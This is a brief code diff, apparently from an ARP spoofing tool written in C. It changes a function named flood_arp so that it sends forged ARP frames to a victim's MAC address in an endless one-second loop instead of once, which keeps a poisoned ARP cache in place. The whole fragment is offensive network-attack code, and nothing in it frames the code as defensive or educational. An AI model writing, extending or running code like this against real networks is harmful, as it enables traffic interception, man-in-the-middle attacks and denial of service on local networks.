@@ -238,8 +238,11 @@ void* flood_arp(void* ta) {
     addr.sll_protocol = htons(ETH_P_ARP);
     memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);
 
-    sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
-            (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
+    for (;;) {
+        sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+                (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
+        sleep(1);
+    }
     return NULL;
 }
 
